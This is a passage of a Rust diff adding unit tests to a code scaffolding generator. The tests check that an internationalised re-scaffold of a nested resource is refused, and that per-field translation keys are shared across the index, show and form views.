+    /// ordinary "I changed a field, re-scaffold it" run does not repeat it, and
+    /// [`super::nested::resolve`] deliberately recovers the relationship from
+    /// the markers in the parent's routes file so the two sides cannot drift
+    /// apart. That recovery has to reach the refusal too: otherwise
+    /// `generate … --force --i18n` on an existing child is accepted, and emits
+    /// nested views whose heading, empty state, add button, and parent backlink
+    /// are still hardcoded English — a half-translated module, which is exactly
+    /// what refusing `--belongs-to` outright exists to prevent.
+    #[test]
+    fn i18n_is_refused_for_nesting_recovered_from_the_parents_markers() {
+        let tmp = project_with_scaffolded_parent();
+        nested_comment_plan(&tmp).execute(Flags::default()).unwrap();
+
+        // No `belongs_to` here — exactly what a forgetful `--force --i18n`
+        // re-scaffold looks like on the command line.
+        let err = plan_scaffold_with_options(
+            tmp.path(),
+            "Comment",
+            &["body:Text".into(), "post:references".into()],
+            "20260429000000",
+            &ScaffoldOptions {
+                i18n: true,
+                ..ScaffoldOptions::default()
+            },
+        )
+        .unwrap_err();
+
+        assert!(
+            matches!(err, GenerateError::Config(_)),
+            "expected a Config error, got {err:?}"
+        );
+        let msg = err.to_string();
+        assert!(
+            msg.contains("--i18n") && msg.contains("posts.rs"),
+            "the refusal must name the flag and the evidence it was recovered from: {msg}"
+        );
+    }
+
+    /// AC2: per-field labels flow through one key per field, used by the index
+    /// column header, the show property row, and the form control alike.
+    #[test]
+    fn i18n_field_labels_share_one_key_per_field() {
+        let tmp = project_with_main(default_main());
+        plan_scaffold_with_options(
+            tmp.path(),
+            "Post",
+            &["title:String".into(), "author_name:String".into()],
+            "20260427000000",
+            &i18n_options(),
+        )
+        .unwrap()
+        .execute(Flags::default())
+        .unwrap();
+        let routes = fs::read_to_string(tmp.path().join("src/routes/posts.rs")).unwrap();
+
+        assert!(
+            routes.contains(".override_label(\"title\", t!(locale, \"post.field.title\"))"),
+            "form controls must relabel through the field key:\n{routes}"
+        );
+        // One key, three surfaces: index header, show row, form label.
+        assert!(
+            routes.matches("\"post.field.author_name\"").count() >= 3,
+            "the field key must serve index, show, and form:\n{routes}"
         );
     }
 }
